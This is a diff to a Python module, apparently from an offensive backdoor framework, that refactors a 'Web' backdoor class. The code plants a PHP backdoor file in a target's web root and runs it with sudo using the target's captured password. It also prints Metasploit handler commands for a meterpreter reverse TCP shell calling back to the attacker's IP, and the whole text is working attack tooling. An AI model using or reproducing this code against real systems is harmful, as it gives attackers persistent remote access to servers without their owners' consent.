@@ -12,15 +12,10 @@ class Web(Backdoor):
                 "name"   : Option("name", "backdoor.php", "name of backdoor", True),
 		}
         self.allow_modules = True
-	self.portModules = {}
-	self.modules = {}
-
-    def get_port(self):
-        return self.get_value("port")
+        self.modules = {}
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S php /var/www/html/" + self.get_value("name")
-
 
     def do_exploit(self, args):
         port = self.get_value("port")
@@ -38,15 +33,12 @@ class Web(Backdoor):
         print("Start a handler with metasploit using the following commands: ")
         print("> use exploit/multi/handler")
         print("> set PAYLOAD php/meterpreter_reverse_tcp")
-	print("> set LHOST " + self.core.localIP)
+        print("> set LHOST " + self.core.localIP)
         print("> set LPORT " + str(port))
         print("> exploit\n")
         print("Then visit the site at " + target.hostname + "/" + name)
         print("To begin your session, type sessions -i [session id]")
-	for mod in self.modules.keys():
+        for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_command())
-        for mod in self.portModules.keys():
-            print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_port())
+            mod.exploit()
   
